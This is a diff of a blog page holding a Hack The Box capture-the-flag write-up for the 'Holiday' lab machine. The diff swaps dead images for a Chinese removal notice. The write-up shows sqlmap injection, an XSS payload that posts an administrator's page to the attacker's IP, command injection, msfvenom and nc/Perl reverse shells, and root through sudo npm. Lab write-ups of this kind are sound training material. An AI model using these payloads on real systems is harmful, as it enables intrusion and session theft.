@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-cn">
 <head>
 
   <meta charset="utf-8" />
@@ -211,7 +211,9 @@
       <h1 class="post-title">Holiday -- hack the box</h1>
       <p class="post-meta">@Neal · May 20, 2019 · 18 min read</p>
     </header>
-    <article class="post-content"><p><img src="https://s2.ax1x.com/2019/05/20/EvqqqH.png" alt="EvqqqH.png"></p>
+    <article class="post-content"><blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <h2 id="introduction">Introduction</h2>
 <p>Target: 10.10.10.25(Linux)</p>
 <p>Kali: 10.10.16.65</p>
@@ -253,7 +255,9 @@ HOP RTT       ADDRESS
 </code></pre><p>There are only two ports open. The port 8000 is an HTTP service which is hosted by Express. It should be our breakthrough.</p>
 <h2 id="exploitation">Exploitation</h2>
 <p>Access to <code>http://10.10.10.25:8000</code>, there is nothing except an image. Download the image, and try to see more information about the image with ExifTool. Nothing interesting found.</p>
-<p><a href="https://imgchr.com/i/EjY0mV"><img src="https://s2.ax1x.com/2019/05/19/EjY0mV.png" alt="EjY0mV.png"></a></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>Then try to brute force the directory. Gobuster and dirbuster seem not to be very useful for this box. If you try dirb, you will soon find some important directories, including admin, login. Try to access <code>http://10.10.10.25:8000/login</code>. It is a login web page. Try to login with some default credentials. Not work. Then use burp to save the login request to a file.</p>
 <pre tabindex="0"><code>POST /login HTTP/1.1
 Host: 10.10.10.25:8000
@@ -271,15 +275,22 @@ username=admin&amp;password=admin
 </code></pre><h3 id="sqlmap">Sqlmap</h3>
 <p>Try to use sqlmap to brute force the login request. Due to the awful network or something, sqlmap is slow for me to use for the boxed in hack the box. So try to prefer to get some important information instead of dump all information in sqlmap. For example, obtain tables firstly. Then dig into the interesting table.</p>
 <pre tabindex="0"><code>sqlmap -r sql.req --level=5 --risk=3 --tables --threads=10
-</code></pre><p><a href="https://imgchr.com/i/Ejdcss"><img src="https://s2.ax1x.com/2019/05/19/Ejdcss.md.png" alt="Ejdcss.md.png"></a></p>
+</code></pre><blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>By sqlmap, it seems that the database is SQLite and there are 5 tables. The <code>users</code> table is interesting. There may are some valid user and password.</p>
 <pre tabindex="0"><code>sqlmap -r sql.req --level=5 --risk=4 -T users --threads=10
-</code></pre><p><img src="https://s2.ax1x.com/2019/05/19/Ej4acR.png" alt="Ej4acR.png"></p>
+</code></pre><blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>A user is found. <a href="https://hashkiller.co.uk/Cracker">Hashkiller</a> is a wonderful hash crack online tool. The hash can be cracked easily.</p>
-<p><img src="https://s2.ax1x.com/2019/05/19/Ej464e.png" alt="Ej464e.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>Log in with this user. It seems to be a booking website.</p>
-<p><img src="https://s2.ax1x.com/2019/05/19/Ej5nUO.png" alt="Ej5nUO.png"></p>
-<p><img src="https://s2.ax1x.com/2019/05/19/Ej4Lgs.png" alt="Ej4Lgs.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>Click any booking and see the booking details. It consists of two tabs, including View and Notes. In Notes, one word is interesting: &ldquo;All notes must be approved by an administrator - this process can take up to 1 minute.&rdquo; An administrator is always attractive to hackers. It seems that the note will be approved by the administrator. So it&rsquo;s possible to steal the session cookie of the administrator if there is an XSS vulnerability in the note edit form. I think it&rsquo;s the hardest part of this box. It&rsquo;s not easy to find the appropriate pass way. There is a way to utilize <code>fromCharCode</code> and other skills to pass the XSS filter. The following javascript code is utilized to generate the payload:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65&#39;</span>;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`$.ajax({method:&#39;GET&#39;,url:&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;,success:function(data){$.post(&#39;http://10.10.16.65&#39;,data)}})`</span>;
@@ -292,13 +303,18 @@ username=admin&amp;password=admin
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">result</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;img src=&#34;x/&gt;&lt;script&gt;eval(String.fromCharCode(</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result</span><span style="color:#e6db74">}</span><span style="color:#e6db74">));&lt;/script&gt;&#34;&gt;`</span>;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">payload</span>);
-</span></span></code></pre></div><p><img src="https://s2.ax1x.com/2019/05/19/Ejv2od.png" alt="Ejv2od.png"></p>
+</span></span></code></pre></div><blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>Set kali to listen to port 80: <code>nc -lvnp 80</code>. The code can be run in the chrome dev. Input the generated payload into the note, wait a minute the data will be sent to kali.</p>
 <p>The cookie of the administrator is obtained which is HTML encoded. Decode it with a burp. And change the cookie in the storage of firefox. Refresh the web page. Now you can hijack the administrator session cookie. Access to <code>http://10.10.10.25:8000/admin</code>. There seems nothing special except two buttons, including Booking and Notes.</p>
-<p><img src="https://s2.ax1x.com/2019/05/19/Ej4oE8.png" alt="admin"></p>
-<p><img src="https://s2.ax1x.com/2019/05/19/EjjOxK.png" alt="EjjOxK.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>After some exploration, you will find that there is command injection in the two function url. You can try to access <code>http://10.10.10.25:8000/admin/export?table=notes%26ls</code>. You can find the directories in the exported file. One thing should be noticed, as <code>&amp;</code> has been prohibited. So you can pass this by <code>%26</code>. Hence, it seems that the table name exists RCE. But it&rsquo;s limited to characters, numbers and <code>/</code>. So you should try to RCE by these. It&rsquo;s not possible to use the command to obtain reverse shell by command. For example, <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</code>. As many characters is not allowed.</p>
-<p><img src="https://s2.ax1x.com/2019/05/20/Ev7Txg.png" alt="Ev7Txg.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <p>Utilize msfvenom to generate the payload:</p>
 <pre tabindex="0"><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.16.65 LPORT=1234 -f elf &gt; shell
 </code></pre><p>Then upload the shell to the victim and execute it. As you are not allowed to use <code>.</code>. So convert the IP address to decimal by <a href="https://www.ipaddressguide.com/ip">this website</a>. Access the following URLs to execute the corresponding commands:</p>
@@ -314,8 +330,9 @@ set LPORT 1234
 set payload linux/x86/meterpreter/reverse_tcp
 run
 </code></pre><p>Then, we get the shell!</p>
-<p><img src="https://s2.ax1x.com/2019/05/20/Evb1cF.png" alt="Evb1cF.png"></p>
-<p><img src="https://s2.ax1x.com/2019/05/20/EvbGnJ.png" alt="EvbGnJ.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 <h2 id="privilege-escalation">Privilege escalation</h2>
 <p>Check the sudo permissions firstly: <code>sudo -l</code>. You will find the user has the permission to execute <code>sudo npm i</code>. <a href="https://github.com/joaojeronimo/rimrafall">rimrafall</a> this repository has described that npm install may be dangerous. It can be utilized to execute commands. You can upload the directory to the victim or create one by yourself.</p>
 <pre tabindex="0"><code>cd app
@@ -342,7 +359,9 @@ echo &#34;module.exports = &#34;install my be dangerousr&#34;&#34; &gt; index.js
 </code></pre><pre tabindex="0"><code>#prel3
 use Socket;$i=&#34;10.10.16.65&#34;;$p=3344;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};
 </code></pre><p>Set kali listen to port 3344: <code>nc -lvnp 3344</code>. In the victim, executed by: <code>sudo npm i rimrafall</code>. Now, we are root!</p>
-<p><img src="https://s2.ax1x.com/2019/05/20/EvqfaR.png" alt="EvqfaR.png"></p>
+<blockquote>
+<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
+</blockquote>
 </article>
     <footer class="post-footer">
       
